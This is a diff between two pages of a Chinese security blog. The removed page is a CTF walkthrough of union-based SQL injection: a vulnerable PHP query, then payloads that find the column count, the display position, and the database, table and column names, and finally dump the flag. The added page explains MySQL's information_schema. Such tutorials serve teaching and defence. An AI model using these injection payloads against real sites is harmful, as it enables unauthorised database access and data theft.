@@ -16,23 +16,23 @@
   <meta name="author" content="liaoyue">
   <meta name="keywords" content="">
   
-    <meta name="description" content="SQL注入——联合查询注入0.前言&amp;emsp;&amp;emsp;联合查询注入是可回显的注入，在联合查询中，一般会将数据库查询的数据返回到页面中。联合查询注入利用的前提是初始的页面上有显示位，在一个网页的正常界面中，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫显示位。 1234567891011&lt;?php...$id&#x3D;$_GET[&amp;#x27;id&amp;#x27">
+    <meta name="description" content="SQL注入——MySQL6.MySQL数据库相关知识1.前言&amp;emsp;&amp;emsp;由于数据库的类型中，MySQL类型数据库是比较主流的，所以需要了解一些MySQL的相关知识。  &amp;emsp;&amp;emsp;可以看到在MYSQL5.0以上版本中，存在着名为information_schema的库，在这个库中存储记录了所有数据库名，表名，列名。也就一般来说我们可以通过查询它获取指定数据库下面的表名或者列">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入——联合查询注入">
-<meta property="og:url" content="https://one-null-pointer.github.io/2022/08/06/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="SQL注入——MySQL">
+<meta property="og:url" content="https://one-null-pointer.github.io/2022/08/05/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94MySQL/index.html">
 <meta property="og:site_name" content="one-null-poniter">
-<meta property="og:description" content="SQL注入——联合查询注入0.前言&amp;emsp;&amp;emsp;联合查询注入是可回显的注入，在联合查询中，一般会将数据库查询的数据返回到页面中。联合查询注入利用的前提是初始的页面上有显示位，在一个网页的正常界面中，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫显示位。 1234567891011&lt;?php...$id&#x3D;$_GET[&amp;#x27;id&amp;#x27">
+<meta property="og:description" content="SQL注入——MySQL6.MySQL数据库相关知识1.前言&amp;emsp;&amp;emsp;由于数据库的类型中，MySQL类型数据库是比较主流的，所以需要了解一些MySQL的相关知识。  &amp;emsp;&amp;emsp;可以看到在MYSQL5.0以上版本中，存在着名为information_schema的库，在这个库中存储记录了所有数据库名，表名，列名。也就一般来说我们可以通过查询它获取指定数据库下面的表名或者列">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://one-null-pointer.github.io/img/web1.png">
-<meta property="article:published_time" content="2022-08-06T06:09:59.000Z">
-<meta property="article:modified_time" content="2022-08-06T10:47:53.006Z">
+<meta property="article:published_time" content="2022-08-05T11:57:05.000Z">
+<meta property="article:modified_time" content="2022-08-06T14:04:50.281Z">
 <meta property="article:author" content="liaoyue">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://one-null-pointer.github.io/img/web1.png">
   
   
   
-  <title>SQL注入——联合查询注入 - one-null-poniter</title>
+  <title>SQL注入——MySQL - one-null-poniter</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -185,7 +185,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="SQL注入——联合查询注入"></span>
+            <span id="subtitle" data-typed-text="SQL注入——MySQL"></span>
           
         </div>
 
@@ -196,8 +196,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-08-06 14:09" pubdate>
-          August 6, 2022 pm
+        <time datetime="2022-08-05 19:57" pubdate>
+          August 5, 2022 pm
         </time>
       </span>
     
@@ -208,7 +208,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.2k words
+          722 words
         
       </span>
     
@@ -219,7 +219,7 @@
         
         
         
-          19 mins
+          7 mins
         
       </span>
     
@@ -257,67 +257,31 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">SQL注入——联合查询注入</h1>
+            <h1 style="display: none">SQL注入——MySQL</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="SQL注入——联合查询注入"><a href="#SQL注入——联合查询注入" class="headerlink" title="SQL注入——联合查询注入"></a>SQL注入——联合查询注入</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;联合查询注入是可回显的注入，在联合查询中，一般会将数据库查询的数据返回到页面中。联合查询注入利用的前提是初始的页面上有显示位，在一个网页的正常界面中，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫显示位。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>...<br><br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]；<br><br><span class="hljs-variable">$getid</span>=<span class="hljs-string">&quot;SELECT id FROM users WHERE uer_id = &#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>;<br><br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$getid</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="hljs-title function_ invoke__">mysql_error</span>().<span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>);<br><br><span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">mysql_numrows</span>(<span class="hljs-variable">$result</span>);<br>...<br></code></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;可以看见在$id变量中，该变量会将get传送过来的参数直接拼接到SQL语句中，如果我们输入的内容为：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;union+select+1+--+</span><br></code></pre></td></tr></table></figure>
-
-<p>  &emsp;&emsp;拼接后SQL语句就变成了：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> user_id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;-1&#x27;</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-comment">-- &#x27;</span><br></code></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp; 闭合前面的单引号，注释掉了后面的单引号，只需要在中间写上需要的Payload（有效负荷代码）就可以了。而加号则是服务器在处理用户输入的时候已自动将其转义为空字符了。</p>
-<p>&emsp;（接下来的演示以BUUCTF中的SQL注入-1为例）：</p>
-<h4 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h4><p>&emsp;&Emsp;我们在可能存在SQL注入变量的后边添加Payload：</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1/and <span class="hljs-attribute">1</span>=2（整型判断）<br><br>单引号判断<span class="hljs-string">&#x27;显示数据库错误信息或者页面回显不同（整型、字符串类型判断）</span><br><span class="hljs-string"></span><br><span class="hljs-string">\（转义符）</span><br><span class="hljs-string"></span><br><span class="hljs-string">-1/+1回显下一个或上一个页面（整型判断）</span><br><span class="hljs-string"></span><br><span class="hljs-string">注：加号&#x27;</span>+<span class="hljs-string">&#x27;在URL中有特殊含义，因此在需要对其进行URL编码为%2b</span><br></code></pre></td></tr></table></figure>
-
+                <h1 id="SQL注入——MySQL"><a href="#SQL注入——MySQL" class="headerlink" title="SQL注入——MySQL"></a>SQL注入——MySQL</h1><h4 id="6-MySQL数据库相关知识"><a href="#6-MySQL数据库相关知识" class="headerlink" title="6.MySQL数据库相关知识"></a>6.MySQL数据库相关知识</h4><h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h4><p>&emsp;&emsp;由于数据库的类型中，MySQL类型数据库是比较主流的，所以需要了解一些MySQL的相关知识。</p>
+<p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94MySQL/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>&emsp;&emsp;可以看到在MYSQL5.0以上版本中，存在着名为information_schema的库，在这个库中存储记录了所有数据库名，表名，列名。也就一般来说我们可以通过查询它获取指定数据库下面的表名或者列名信息。而在数据库中符号“.”代表下一级，譬如liaoyue.use代表的意思是liaoyue数据下名为user的表。这都是要掌握的相关知识。</p>
+<h4 id="2-MySQL-5-x结构"><a href="#2-MySQL-5-x结构" class="headerlink" title="2.MySQL 5.x结构"></a>2.MySQL 5.x结构</h4><ol>
+<li>在MySQL 5.0以上版本中，为了方便管理，默认定义了information_schema数据 库，用来存储数据库元信息，其中具有表schemata（数据库名），table（表名），columns（列名或字段名）</li>
+<li>在schemata表中，schema_name字段用来存储数据库名</li>
+<li>在table表中，table_schema和table_name分别用来存储数据库名和表名</li>
+<li>在column表中，table_schema（数据库名），table_name（表名），column_name（字段名）</li>
+</ol>
+<h4 id="3-常用的相关参数"><a href="#3-常用的相关参数" class="headerlink" title="3.常用的相关参数"></a>3.常用的相关参数</h4><ul>
+<li>information_schema.tables：记录所有表名信息的表</li>
+<li>information_schema.columns：记录所有列名信息的表</li>
+<li>table_name：表名</li>
+<li>column_name：列名</li>
+<li>table_schema：数据库名</li>
+<li>user()  查看当前MySQL登录的用户名</li>
+<li>database()   查看当前使用MySQL数据库名</li>
+<li>version()  查看当前MySQL版本</li>
+</ul>
 <p>&emsp;</p>
-<h4 id="2-判断是整型还是字符型"><a href="#2-判断是整型还是字符型" class="headerlink" title="2.判断是整型还是字符型"></a>2.判断是整型还是字符型</h4><p>&emsp;&emsp;输入and 1=1和and 1=2根据界面是否变化判断是否为整型注入。  判断是字符型还是数字型的表格：</p>
-<p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/3.png" srcset="/img/loading.gif" lazyload></p>
-<p>输入’ and 1=1 %23和 ‘ and 1=2%23后发现页面变化，判断为字符注入 </p>
-<p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/1.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/2.png" srcset="/img/loading.gif" lazyload></p>
-<p>&emsp;&emsp;</p>
-<h4 id="3-判断查询列数"><a href="#3-判断查询列数" class="headerlink" title="3.判断查询列数"></a>3.判断查询列数</h4><p> &emsp;&emsp;order by 函数是对MySQL中查询结果按照指定字段名进行排序，除了指定字 段名还可以指定字段的栏位进行排序，第一个查询字段为1，第二个为2，依次 类推。</p>
-<p>&emsp;&emsp;输入3列时，页面正常: </p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;order by 3%23</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/4.png" srcset="/img/loading.gif" lazyload></p>
-<p>&emsp;&emsp;输入4列时,页面出错，说明只有3列</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;order by 4%23</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/5.png" srcset="/img/loading.gif" lazyload></p>
-<p>&emsp;</p>
-<h4 id="4-判断显示位"><a href="#4-判断显示位" class="headerlink" title="4.判断显示位"></a>4.判断显示位</h4><p>&emsp;&emsp;union的作用是将两个select查询结果合并，程序在展示数据的时候通常只会取结果集的第一行数据，看一下源码，mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3%23</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/6.png" srcset="/img/loading.gif" lazyload></p>
-<p>&emsp;</p>
-<h4 id="5-获取所有数据库名"><a href="#5-获取所有数据库名" class="headerlink" title="5.获取所有数据库名"></a>5.获取所有数据库名</h4><p>&emsp;&emsp;可以通过使用注入查询数据库语句显示当前所有数据库： databas()</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/7.png" srcset="/img/loading.gif" lazyload></p>
-<p>&emsp;&emsp;可以看见，输入完毕后，第三行会将所存在的数据库输出到显示屏中    </p>
-<p>&emsp;</p>
-<h4 id="6-获取表名"><a href="#6-获取表名" class="headerlink" title="6.获取表名"></a>6.获取表名</h4><p>&emsp;&emsp;在获取数据库的信息后，查找对应数据库里所拥有的表：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>mysql<span class="hljs-string">&#x27;),3%23</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/8.png" srcset="/img/loading.gif" lazyload></p>
-<p>&emsp;&emsp;’mysql’为数据库名，通过改变数据库名，进行不同数据库的内容查询</p>
-<p>&emsp;</p>
-<h4 id="7-获列名"><a href="#7-获列名" class="headerlink" title="7.获列名"></a>7.获列名</h4><p>&emsp;&emsp;查看表的内容</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>note<span class="hljs-string">&#x27; and table_name=&#x27;</span>fl4g<span class="hljs-string">&#x27;),3%23</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/9.png" srcset="/img/loading.gif" lazyload></p>
-<h4 id="8-获取列中的信息"><a href="#8-获取列中的信息" class="headerlink" title="8.获取列中的信息"></a>8.获取列中的信息</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(fllllag),3 from fl4g%23</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/10.png" srcset="/img/loading.gif" lazyload></p>
-<p>&emsp;&emsp;最终获得flag</p>
 
                 
               </div>
@@ -356,8 +320,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>SQL注入——联合查询注入</div>
-      <div>https://one-null-pointer.github.io/2022/08/06/SQL注入—联合查询注入/</div>
+      <div>SQL注入——MySQL</div>
+      <div>https://one-null-pointer.github.io/2022/08/05/SQL注入——MySQL/</div>
     </div>
     <div class="license-meta">
       
@@ -369,7 +333,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>August 6, 2022</div>
+          <div>August 5, 2022</div>
         </div>
       
       
@@ -399,12 +363,18 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2022/08/06/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/" title="SQL注入——联合查询注入">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SQL注入——联合查询注入</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/08/05/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94MySQL/" title="SQL注入——MySQL">
-                        <span class="hidden-mobile">SQL注入——MySQL</span>
+                      <a href="/2022/08/04/SQL%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="SQL注入基础知识">
+                        <span class="hidden-mobile">SQL注入基础知识</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
